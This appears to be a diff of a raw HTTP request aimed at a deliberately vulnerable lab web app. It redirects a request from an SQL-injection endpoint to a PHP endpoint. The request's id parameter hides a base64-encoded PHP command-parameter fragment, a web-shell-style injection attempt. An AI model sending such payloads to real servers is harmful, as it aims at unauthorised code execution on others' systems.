@@ -1,4 +1,4 @@
-GET /vulnerabilities/sqli/?id=%7B%22id%22%3A%22PD9waHAgJF9QT1NUW2NtZF07%22%7D&Submit=Submit HTTP/1.1
+GET /vulnerabilities/php/?id=%7B%22id%22%3A%22PD9waHAgJF9QT1NUW2NtZF07%22%7D&Submit=Submit HTTP/1.1
 Host: 10.10.3.128:2280
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
